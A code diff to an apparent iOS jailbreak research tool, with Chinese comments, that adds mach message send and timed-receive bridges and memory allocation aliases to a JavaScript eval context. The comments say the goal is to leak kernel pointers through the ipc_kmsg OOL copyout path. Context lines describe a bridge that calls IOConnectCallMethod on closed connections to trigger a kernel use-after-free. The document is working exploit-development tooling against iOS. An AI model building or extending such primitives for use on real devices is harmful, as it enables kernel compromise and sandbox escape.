@@ -602,6 +602,61 @@ static unsigned long long vmAllocNative(unsigned long long size) {
 static long vmDeallocNative(unsigned long long addr, unsigned long long size) {
     return (long)vm_deallocate(mach_task_self(), (vm_address_t)addr, (vm_size_t)size);
 }
+
+// ============================================================
+//  V2.4.35 mach OOL 消息收发桥（Ry-JB 论坛 #22 请求）
+//  背景：验证 ipc_kmsg OOL copyout 路径的内核栈泄漏候选，需要在沙盒内完成
+//        "自组 mach 消息(含 OOL 描述符)→发送→带超时接收→扫内核指针"。
+//  关键订正：mach_msg_timeout 不是导出符号，它是 mach_msg 的第 6 个形参；
+//           超时接收 = mach_msg(buf, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, size, port, timeoutMs, NULL)。
+//  持久缓冲区用已有 vmAlloc（勿重复造轮子）；OOL 描述符 address 指向 vmAlloc 出来的地址。
+//  上限 64KB，与 memRead/memWrite 对称；失败返 {ok:false,error}，不崩。
+// ============================================================
+// hex 串 → NSData（与 memWrite 同套解析：可含空格/换行/0x 前缀，须偶数长度）
+static NSData *ryHexToData(NSString *hex) {
+    if (![hex isKindOfClass:[NSString class]]) return nil;
+    NSString *clean = [[hex stringByReplacingOccurrencesOfString:@" " withString:@""]
+                       stringByReplacingOccurrencesOfString:@"\n" withString:@""];
+    clean = [clean stringByReplacingOccurrencesOfString:@"\r" withString:@""];
+    if ([clean hasPrefix:@"0x"] || [clean hasPrefix:@"0X"]) clean = [clean substringFromIndex:2];
+    clean = [clean stringByReplacingOccurrencesOfString:@"0x" withString:@""];
+    if (clean.length < 2 || (clean.length % 2) != 0) return nil;
+    NSMutableData *md = [NSMutableData dataWithCapacity:clean.length / 2];
+    for (NSUInteger i = 0; i + 1 < clean.length; i += 2) {
+        unsigned int b = 0;
+        if (![[NSScanner scannerWithString:[clean substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&b]) return nil;
+        unsigned char c = (unsigned char)b; [md appendBytes:&c length:1];
+    }
+    return md;
+}
+// 发送：bufHex = 完整 mach 消息字节（头+描述符+内联；OOL 负载地址由调用方用 vmAlloc 填进描述符）。
+//   port>0 时以其为准覆盖 msgh_remote_port（防御性）；size 必须 20..65536。
+static NSString *machMsgSendNative(long port, NSString *bufHex, unsigned long long size) {
+    NSData *b = ryHexToData(bufHex);
+    if (!b || b.length < 20 || size < 20 || size > 65536)
+        return @"{\"ok\":false,\"error\":\"bad msg: size 需 20..65536 且 bufHex 为偶数 hex\"}";
+    if (b.length < (NSUInteger)size) size = (unsigned long long)b.length;
+    NSMutableData *mb = [NSMutableData dataWithData:b];
+    mach_msg_header_t *h = (mach_msg_header_t *)[mb mutableBytes];
+    h->msgh_size = (mach_msg_size_t)size;
+    if (port > 0) h->msgh_remote_port = (mach_port_name_t)port;
+    mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG, (mach_msg_size_t)size, 0,
+                                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    return [NSString stringWithFormat:@"{\"ok\":%d,\"kr\":%d}", kr == MACH_MSG_SUCCESS, (int)kr];
+}
+// 接收（超时版）：timeoutMs 到期返回 MACH_RCV_TIMED_OUT(0x10000003)，不挂死 eval 线程。
+static NSString *machMsgRecvNative(long port, unsigned long long size, long timeoutMs) {
+    if (size == 0 || size > 65536) return @"{\"ok\":false,\"error\":\"bad size: 1..65536\"}";
+    void *buf = calloc(1, (size_t)size);
+    if (!buf) return @"{\"ok\":false,\"error\":\"alloc fail\"}";
+    mach_msg_return_t kr = mach_msg((mach_msg_header_t *)buf,
+        MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)size,
+        (mach_port_name_t)port, (mach_msg_timeout_t)timeoutMs, MACH_PORT_NULL);
+    NSData *d = [NSData dataWithBytes:buf length:(NSUInteger)size];
+    free(buf);
+    return [NSString stringWithFormat:@"{\"ok\":%d,\"kr\":%d,\"buf\":\"%@\"}",
+            kr == MACH_MSG_SUCCESS, (int)kr, [d base64EncodedStringWithOptions:0]];
+}
 // ★ 打通 Tier 1 内核竞态：直接对 port name 发 IOConnectCallMethod，**跳过 ryConnProblem 用户态体检**。
 //   使用侧拿"已 iokitClose 的 conn 数字"强行发内核调用 → 内核 ipc_port 已释放仍被 send-right 解引用 → UAF。
 //   返回对象 {ret, ok, outputs, inCount}（与 iokitCall 形态一致，JS 侧取 .ret/.ok）。
@@ -3488,6 +3543,12 @@ ctx[@"runCommand"]=^NSString*(NSString *cmd){
             ctx[@"portType"]       = ^(NSNumber *n){ return @(portTypeNative([n longValue])); };
             ctx[@"vmAlloc"]        = ^(NSNumber *sz){ return @(vmAllocNative([sz unsignedLongLongValue])); };
             ctx[@"vmDealloc"]      = ^(NSNumber *a, NSNumber *sz){ return @(vmDeallocNative([a unsignedLongLongValue], [sz unsignedLongLongValue])); };
+            // V2.4.35：memAlloc/memFree = vmAlloc/vmDealloc 的别名（Ry-JB #22 习惯名；vmAlloc 本就是可持久使用的地址、非一次性 {buf} 缓冲）
+            ctx[@"memAlloc"]       = ^(NSNumber *sz){ return @(vmAllocNative([sz unsignedLongLongValue])); };
+            ctx[@"memFree"]        = ^(NSString *addrHex, NSNumber *sz){ return @(vmDeallocNative((unsigned long long)objcHexToPtr(addrHex), [sz unsignedLongLongValue])); };
+            // V2.4.35：mach OOL 消息收发（超时版）——timeout 是 mach_msg 第 6 形参，MACH_RCV_TIMEOUT 实现，不再挂死 eval
+            ctx[@"machMsgSend"]    = ^(NSNumber *p, NSString *hex, NSNumber *sz){ return machMsgSendNative([p longValue], hex, [sz unsignedLongLongValue]); };
+            ctx[@"machMsgRecv"]    = ^(NSNumber *p, NSNumber *sz, NSNumber *t){ return machMsgRecvNative([p longValue], [sz unsignedLongLongValue], [t longValue]); };
             // ★ 打通 Tier 1：直接对 port name（含已 iokitClose 的 conn）发 IOConnectCallMethod，跳过 ryConnProblem 拦截
             ctx[@"iokitCallPort"]  = ^(NSNumber *conn, NSNumber *sel, NSArray *inp){ return iokitCallPortNative([conn longValue], [sel unsignedIntValue], inp); };
 
